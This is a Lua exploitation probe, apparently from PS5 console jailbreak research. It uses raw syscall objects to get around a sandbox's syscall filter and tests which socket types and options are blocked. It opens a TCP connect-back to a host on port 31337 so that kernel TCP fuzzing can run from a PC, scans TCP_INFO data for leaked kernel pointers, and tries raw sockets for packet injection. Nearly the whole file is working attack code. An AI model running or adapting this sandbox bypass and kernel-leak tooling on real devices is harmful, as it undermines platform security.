-- CRASH_CLASS: LOW
-- PROBE 46c: SOCKET OPS VIA MAKE_SYSCALL + TCP CONNECT-BACK
--
-- Context: ALL existing network probes use syscall.resolve() for socket ops.
-- resolve() has a filter that blocks many syscalls. make_syscall() bypasses it.
-- This probe tests every socket-related syscall via make_syscall to find ops
-- that are blocked by resolve but work raw. Then creates a TCP connection
-- back to PC for kernel-side TCP fuzzing.
--
-- BEFORE SENDING: Set PC_IP below to your PC's LAN IP address.

local PC_IP = "10.0.0.2"    -- *** CHANGE THIS TO YOUR PC's IP ***
local PC_PORT = 31337

print("=== PROBE 46c: SOCKET BYPASS + TCP CONNECT-BACK ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function fmt_addr(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("%08X_%08X", h, l)
end

local pid = to_num(make_syscall(20)())
print("pid: " .. pid)
print("target: " .. PC_IP .. ":" .. PC_PORT)
print("")

-- Socket constants
local AF_INET     = 2
local AF_INET6    = 28
local AF_LOCAL    = 1
local SOCK_STREAM = 1
local SOCK_DGRAM  = 2
local SOCK_RAW    = 3
local IPPROTO_TCP = 6
local IPPROTO_UDP = 17
local IPPROTO_RAW = 255
local IPPROTO_ICMP = 1
local SOL_SOCKET  = 0xFFFF
local SO_REUSEADDR = 4
local SO_RCVTIMEO = 0x1006
local IP_HDRINCL  = 2
local IPPROTO_IP  = 0
local TCP_INFO    = 32

-- FreeBSD syscall numbers
local SYS_close    = 6
local SYS_recvmsg  = 27
local SYS_sendmsg  = 28
local SYS_recvfrom = 29
local SYS_accept   = 30
local SYS_getpeername = 31
local SYS_getsockname = 32
local SYS_select   = 93
local SYS_socket   = 97
local SYS_connect  = 98
local SYS_bind     = 104
local SYS_setsockopt = 105
local SYS_listen   = 106
local SYS_getsockopt = 118
local SYS_shutdown = 134
local SYS_socketpair = 135
local SYS_sendto   = 133
local SYS_poll     = 209
local SYS_accept4  = 541

-- Helper: build sockaddr_in
local function make_sockaddr_in(ip, port)
    local sa = memory.alloc(16)
    -- FreeBSD sockaddr_in: len(1), family(1), port(2), addr(4), zero(8)
    safe_wd(sa, 0x10 + (AF_INET * 0x100))  -- len=16, family=AF_INET
    -- port in network byte order (big-endian)
    local port_be = bit32.bor(bit32.lshift(bit32.band(port, 0xFF), 8),
                               bit32.rshift(port, 8))
    safe_wd(sa, bit32.bor(0x0210, bit32.lshift(port_be, 16)))
    -- IP address
    local a, b, c, d = ip:match("(%d+)%.(%d+)%.(%d+)%.(%d+)")
    if a then
        local ip_val = tonumber(a) + tonumber(b) * 0x100 +
                       tonumber(c) * 0x10000 + tonumber(d) * 0x1000000
        safe_wd(sa + 4, ip_val)
    end
    safe_wd(sa + 8, 0)
    safe_wd(sa + 12, 0)
    return sa
end

-- ============================================
-- SECTION A: SOCKET SYSCALL COMPARISON
-- ============================================
print("=== A: SOCKET SYSCALL COMPARISON ===")
print("Testing which socket ops work via make_syscall vs resolve")
print("")

-- Test socket creation via make_syscall
local function test_socket_ms(af, stype, proto, label)
    local sc = make_syscall(SYS_socket)
    local ok, ret = pcall(function() return sc(uint64(af), uint64(stype), uint64(proto)) end)
    local fd = ok and to_num(ret) or -999
    print(string.format("  make_syscall socket(%d,%d,%d) [%s]: fd=%d", af, stype, proto, label, fd))
    return fd
end

-- Test socket creation via resolve
local function test_socket_rs(af, stype, proto, label)
    local ok, sock = pcall(function()
        return syscall.socket(af, stype, proto)
    end)
    if ok and sock then
        local fd = to_num(sock)
        print(string.format("  resolve socket(%d,%d,%d) [%s]: fd=%d", af, stype, proto, label, fd))
        return fd
    else
        print(string.format("  resolve socket(%d,%d,%d) [%s]: FAILED (%s)", af, stype, proto, label,
            tostring(sock or "nil")))
        return -1
    end
end

-- Test various socket types
local socket_tests = {
    {AF_INET, SOCK_STREAM, 0,           "TCP"},
    {AF_INET, SOCK_DGRAM,  0,           "UDP"},
    {AF_INET, SOCK_RAW,    IPPROTO_RAW, "RAW"},
    {AF_INET, SOCK_RAW,    IPPROTO_ICMP,"ICMP"},
    {AF_INET, SOCK_RAW,    IPPROTO_TCP, "RAW_TCP"},
    {AF_INET, SOCK_RAW,    IPPROTO_UDP, "RAW_UDP"},
    {AF_INET6,SOCK_STREAM, 0,           "TCP6"},
    {AF_INET6,SOCK_DGRAM,  0,           "UDP6"},
    {AF_INET6,SOCK_RAW,    IPPROTO_RAW, "RAW6"},
    {AF_LOCAL,SOCK_STREAM, 0,           "UNIX_STREAM"},
    {AF_LOCAL,SOCK_DGRAM,  0,           "UNIX_DGRAM"},
    {AF_INET, SOCK_STREAM, 132,         "SCTP"},     -- IPPROTO_SCTP=132
}

print("via make_syscall:")
local fds_to_close = {}
for _, t in ipairs(socket_tests) do
    local fd = test_socket_ms(t[1], t[2], t[3], t[4])
    if fd >= 0 then table.insert(fds_to_close, fd) end
end

print("")
print("via resolve:")
for _, t in ipairs(socket_tests) do
    local fd = test_socket_rs(t[1], t[2], t[3], t[4])
    if fd >= 0 then table.insert(fds_to_close, fd) end
end

-- Clean up test sockets
local sc_close = make_syscall(SYS_close)
for _, fd in ipairs(fds_to_close) do
    pcall(function() sc_close(uint64(fd)) end)
end
print("")

-- ============================================
-- SECTION B: SOCKET OPTION TESTS VIA MAKE_SYSCALL
-- ============================================
print("=== B: SOCKET OPTION BYPASS ===")

-- Create a TCP socket via make_syscall
local sc_socket = make_syscall(SYS_socket)
local ok_s, tcp_fd = pcall(function()
    return sc_socket(uint64(AF_INET), uint64(SOCK_STREAM), uint64(0))
end)
tcp_fd = ok_s and to_num(tcp_fd) or -1
print("TCP socket via make_syscall: fd=" .. tcp_fd)

if tcp_fd >= 0 then
    local sc_setsockopt = make_syscall(SYS_setsockopt)
    local sc_getsockopt = make_syscall(SYS_getsockopt)
    local optval = memory.alloc(256)
    local optlen = memory.alloc(8)

    -- Test setsockopt operations that might be blocked by resolve
    local sockopts = {
        {SOL_SOCKET, 0x0004, 1,      "SO_REUSEADDR"},
        {SOL_SOCKET, 0x0008, 1,      "SO_KEEPALIVE"},
        {SOL_SOCKET, 0x0080, 1,      "SO_OOBINLINE"},
        {SOL_SOCKET, 0x1001, 65536,  "SO_SNDBUF"},
        {SOL_SOCKET, 0x1002, 65536,  "SO_RCVBUF"},
        {SOL_SOCKET, 0x0020, 1,      "SO_TIMESTAMP"},
        {SOL_SOCKET, 0x0400, 1,      "SO_NOSIGPIPE"},
        {6,          0x01,   1,      "TCP_NODELAY"},        -- IPPROTO_TCP=6
        {6,          0x02,   30,     "TCP_MAXSEG"},
        {6,          0x04,   1,      "TCP_NOPUSH"},
        {6,          0x08,   1,      "TCP_NOOPT"},
        {6,          0x200,  1,      "TCP_FASTOPEN"},       -- 0x200 = 512
        {IPPROTO_IP, IP_HDRINCL, 1,  "IP_HDRINCL"},
        {IPPROTO_IP, 0x15,  1,      "IP_RECVTTL"},
        {IPPROTO_IP, 0x1B,  1,      "IP_RECVTOS"},
    }

    for _, opt in ipairs(sockopts) do
        safe_wd(optval, opt[3])
        local ok_so, ret_so = pcall(function()
            return sc_setsockopt(uint64(tcp_fd), uint64(opt[1]), uint64(opt[2]),
                uint64(optval), uint64(4))
        end)
        local r = ok_so and to_num(ret_so) or -999
        print(string.format("  setsockopt(%s): ret=%d", opt[4], r))
    end

    -- Test getsockopt for TCP_INFO (might reveal kernel state)
    print("")
    print("  TCP_INFO via make_syscall:")
    for i = 0, 255, 4 do safe_wd(optval + i, 0) end
    safe_wd(optlen, 256)
    local ok_gi, ret_gi = pcall(function()
        return sc_getsockopt(uint64(tcp_fd), uint64(6), uint64(TCP_INFO),
            uint64(optval), uint64(optlen))
    end)
    local gi_ret = ok_gi and to_num(ret_gi) or -999
    local gi_len = safe_rd(optlen) or 0
    print("    ret=" .. gi_ret .. " len=" .. gi_len)
    if gi_ret == 0 and gi_len > 0 then
        print("    first 64 bytes:")
        for off = 0, math.min(63, gi_len - 1), 4 do
            local v = safe_rd(optval + off)
            print(string.format("      +%03d: 0x%08X (%d)", off, v or 0, v or 0))
        end
    end

    -- Close test socket
    pcall(function() sc_close(uint64(tcp_fd)) end)
end
print("")

-- ============================================
-- SECTION C: SOCKETPAIR / ACCEPT4 BYPASS
-- ============================================
print("=== C: SOCKETPAIR / ACCEPT4 BYPASS ===")

-- socketpair(135): might work via make_syscall
local sc_socketpair = make_syscall(SYS_socketpair)
local sp_fds = memory.alloc(16)
safe_wd(sp_fds, 0xFFFFFFFF)
safe_wd(sp_fds + 4, 0xFFFFFFFF)
local ok_sp, ret_sp = pcall(function()
    return sc_socketpair(uint64(AF_LOCAL), uint64(SOCK_STREAM), uint64(0), uint64(sp_fds))
end)
local sp_ret = ok_sp and to_num(ret_sp) or -999
local sp_fd0 = safe_rd(sp_fds)
local sp_fd1 = safe_rd(sp_fds + 4)
print("socketpair(AF_LOCAL,STREAM) via make_syscall: ret=" .. sp_ret ..
      " fd0=" .. (sp_fd0 or "?") .. " fd1=" .. (sp_fd1 or "?"))
if sp_fd0 and sp_fd0 ~= 0xFFFFFFFF then
    pcall(function() sc_close(uint64(sp_fd0)) end)
end
if sp_fd1 and sp_fd1 ~= 0xFFFFFFFF then
    pcall(function() sc_close(uint64(sp_fd1)) end)
end

-- accept4(541): has flags parameter — might bypass sandbox differently
local sc_accept4 = make_syscall(SYS_accept4)
print("accept4 syscall object created: " .. type(sc_accept4))

-- Test via resolve too
local ok_spr, ret_spr = pcall(function()
    return syscall.socketpair(AF_LOCAL, SOCK_STREAM, 0)
end)
print("socketpair via resolve: " .. (ok_spr and "ok" or "FAILED: " .. tostring(ret_spr)))
print("")

-- ============================================
-- SECTION D: TCP CONNECT-BACK VIA MAKE_SYSCALL
-- ============================================
print("=== D: TCP CONNECT-BACK ===")
print("Connecting to " .. PC_IP .. ":" .. PC_PORT .. " via make_syscall")

-- Create TCP socket
local sc_sock = make_syscall(SYS_socket)
local ok_cs, conn_fd = pcall(function()
    return sc_sock(uint64(AF_INET), uint64(SOCK_STREAM), uint64(0))
end)
conn_fd = ok_cs and to_num(conn_fd) or -1
print("  socket: fd=" .. conn_fd)

if conn_fd < 0 then
    print("  *** socket creation failed, trying via resolve ***")
    local ok_rs
    ok_rs, conn_fd = pcall(function()
        local s = syscall.socket(AF_INET, SOCK_STREAM, 0)
        return to_num(s)
    end)
    conn_fd = ok_rs and conn_fd or -1
    print("  resolve socket: fd=" .. conn_fd)
end

if conn_fd >= 0 then
    -- Set receive timeout (5 seconds)
    local tv = memory.alloc(16)
    safe_wd(tv, 5)      -- tv_sec
    safe_wd(tv + 4, 0)  -- zero padding
    safe_wd(tv + 8, 0)  -- tv_usec
    safe_wd(tv + 12, 0)
    local sc_setopt = make_syscall(SYS_setsockopt)
    pcall(function()
        sc_setopt(uint64(conn_fd), uint64(SOL_SOCKET), uint64(SO_RCVTIMEO),
            uint64(tv), uint64(16))
    end)

    -- Connect
    local sa = make_sockaddr_in(PC_IP, PC_PORT)
    local sc_connect = make_syscall(SYS_connect)
    local ok_conn, ret_conn = pcall(function()
        return sc_connect(uint64(conn_fd), uint64(sa), uint64(16))
    end)
    local conn_ret = ok_conn and to_num(ret_conn) or -999
    print("  connect: ret=" .. conn_ret)

    if conn_ret == 0 then
        print("  *** CONNECTED ***")

        -- Send hello
        local hello = memory.alloc(32)
        safe_wd(hello, 0x21355350)       -- "PS5!" (little-endian)
        safe_wd(hello + 4, 0x63363420)   -- " 46c"
        safe_wd(hello + 8, 0x0A)
        local sc_sendto = make_syscall(SYS_sendto)
        pcall(function()
            sc_sendto(uint64(conn_fd), uint64(hello), uint64(9),
                uint64(0), uint64(0), uint64(0))
        end)
        print("  sent hello")

        -- Get local addr for reporting
        local sc_getsockname = make_syscall(SYS_getsockname)
        local local_sa = memory.alloc(32)
        local local_len = memory.alloc(8)
        safe_wd(local_len, 32)
        pcall(function()
            sc_getsockname(uint64(conn_fd), uint64(local_sa), uint64(local_len))
        end)
        local local_port_raw = safe_rd(local_sa)
        local local_ip = safe_rd(local_sa + 4)
        if local_port_raw then
            local lp = bit32.band(bit32.rshift(local_port_raw, 16), 0xFFFF)
            lp = bit32.bor(bit32.lshift(bit32.band(lp, 0xFF), 8),
                           bit32.rshift(lp, 8))
            print("  local port: " .. lp)
        end

        -- Recv loop — stay alive for PC-side fuzzing
        -- 200 iterations × 1s timeout = ~200 seconds
        local sc_recvfrom = make_syscall(SYS_recvfrom)
        local recv_buf = memory.alloc(4096)
        local recv_count = 0
        local error_count = 0
        local total_bytes = 0

        print("")
        print("  entering recv loop (200 iterations, 5s timeout each)")
        print("  start PC-side fuzzer now!")
        print("")

        -- Also prepare getsockopt buffer for periodic TCP_INFO checks
        local sc_getopt = make_syscall(SYS_getsockopt)
        local info_buf = memory.alloc(256)
        local info_len = memory.alloc(8)

        for i = 1, 200 do
            -- Receive data
            local ok_r, ret_r = pcall(function()
                return sc_recvfrom(uint64(conn_fd), uint64(recv_buf), uint64(4096),
                    uint64(0), uint64(0), uint64(0))
            end)
            local nbytes = ok_r and to_num(ret_r) or -1

            if nbytes > 0 then
                recv_count = recv_count + 1
                total_bytes = total_bytes + nbytes
                -- Show first 16 bytes of received data
                local hex = ""
                for j = 0, math.min(15, nbytes - 1) do
                    local ok_b, b = pcall(function()
                        return memory.read_byte(recv_buf + j)
                    end)
                    if ok_b then
                        hex = hex .. string.format("%02x", to_num(b))
                    end
                end
                print(string.format("  [%3d] recv %d bytes: %s...", i, nbytes, hex))
            elseif nbytes == 0 then
                print(string.format("  [%3d] connection closed by peer", i))
                break
            else
                -- Timeout or error — check if socket is still alive
                error_count = error_count + 1
                if error_count <= 3 or error_count % 20 == 0 then
                    print(string.format("  [%3d] recv error/timeout (count=%d)", i, error_count))
                end
            end

            -- Every 10 iterations, check TCP state
            if i % 10 == 0 then
                for j = 0, 255, 4 do safe_wd(info_buf + j, 0) end
                safe_wd(info_len, 256)
                local ok_ti, ret_ti = pcall(function()
                    return sc_getopt(uint64(conn_fd), uint64(6), uint64(TCP_INFO),
                        uint64(info_buf), uint64(info_len))
                end)
                if ok_ti and to_num(ret_ti) == 0 then
                    local state = safe_rd(info_buf)       -- tcpi_state
                    local opts = safe_rd(info_buf + 4)    -- tcpi_options
                    local snd_mss = safe_rd(info_buf + 12)
                    local rcv_mss = safe_rd(info_buf + 16)
                    print(string.format("  [%3d] TCP state=%d opts=0x%X snd_mss=%d rcv_mss=%d",
                        i, state or 0, opts or 0, snd_mss or 0, rcv_mss or 0))

                    -- Scan TCP_INFO for kernel pointers
                    local ti_len = safe_rd(info_len) or 0
                    for off = 0, ti_len - 8, 8 do
                        local val = safe_rq(info_buf + off)
                        if val then
                            local h, l = get_hi_lo(val)
                            if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                                print(string.format("  *** KERNEL PTR in TCP_INFO +%d: %08X_%08X ***",
                                    off, h, l))
                            end
                        end
                    end
                end
            end

            -- After 40 timeout errors with no data, connection is probably dead
            if error_count > 40 and recv_count == 0 then
                print("  too many errors with no data, stopping")
                break
            end
        end

        print("")
        print("  recv loop done: received " .. recv_count .. " messages, " ..
              total_bytes .. " bytes, " .. error_count .. " errors")

        -- Final TCP_INFO dump
        print("")
        print("  Final TCP_INFO:")
        for j = 0, 255, 4 do safe_wd(info_buf + j, 0) end
        safe_wd(info_len, 256)
        pcall(function()
            sc_getopt(uint64(conn_fd), uint64(6), uint64(TCP_INFO),
                uint64(info_buf), uint64(info_len))
        end)
        local final_len = safe_rd(info_len) or 0
        for off = 0, math.min(63, final_len - 1), 4 do
            local v = safe_rd(info_buf + off)
            print(string.format("    +%03d: 0x%08X", off, v or 0))
        end
    else
        print("  *** connect failed (ret=" .. conn_ret .. ") ***")
        print("  make sure PC-side server is running on " .. PC_IP .. ":" .. PC_PORT)
    end

    -- Close socket
    pcall(function() sc_close(uint64(conn_fd)) end)
else
    print("  *** no socket available ***")
end
print("")

-- ============================================
-- SECTION E: RAW SOCKET FOR IP-LEVEL INJECTION
-- ============================================
print("=== E: RAW SOCKET STATUS ===")

-- Create RAW socket via make_syscall
local sc_rawsock = make_syscall(SYS_socket)
local ok_raw, raw_fd = pcall(function()
    return sc_rawsock(uint64(AF_INET), uint64(SOCK_RAW), uint64(IPPROTO_RAW))
end)
raw_fd = ok_raw and to_num(raw_fd) or -1
print("RAW socket via make_syscall: fd=" .. raw_fd)

if raw_fd >= 0 then
    -- Enable IP_HDRINCL
    local hdrincl = memory.alloc(4)
    safe_wd(hdrincl, 1)
    local sc_so = make_syscall(SYS_setsockopt)
    local ok_hi, ret_hi = pcall(function()
        return sc_so(uint64(raw_fd), uint64(IPPROTO_IP), uint64(IP_HDRINCL),
            uint64(hdrincl), uint64(4))
    end)
    print("IP_HDRINCL: ret=" .. (ok_hi and to_num(ret_hi) or -999))

    -- Test: can we also create a RAW TCP socket? (for injecting TCP packets)
    local ok_rtcp, rtcp_fd = pcall(function()
        return sc_rawsock(uint64(AF_INET), uint64(SOCK_RAW), uint64(IPPROTO_TCP))
    end)
    rtcp_fd = ok_rtcp and to_num(rtcp_fd) or -1
    print("RAW TCP socket: fd=" .. rtcp_fd)
    if rtcp_fd >= 0 then
        pcall(function() sc_close(uint64(rtcp_fd)) end)
    end

    -- Test RAW ICMP socket
    local ok_ricmp, ricmp_fd = pcall(function()
        return sc_rawsock(uint64(AF_INET), uint64(SOCK_RAW), uint64(IPPROTO_ICMP))
    end)
    ricmp_fd = ok_ricmp and to_num(ricmp_fd) or -1
    print("RAW ICMP socket: fd=" .. ricmp_fd)
    if ricmp_fd >= 0 then
        pcall(function() sc_close(uint64(ricmp_fd)) end)
    end

    pcall(function() sc_close(uint64(raw_fd)) end)
end
print("")

print("=== PROBE 46c COMPLETE ===")
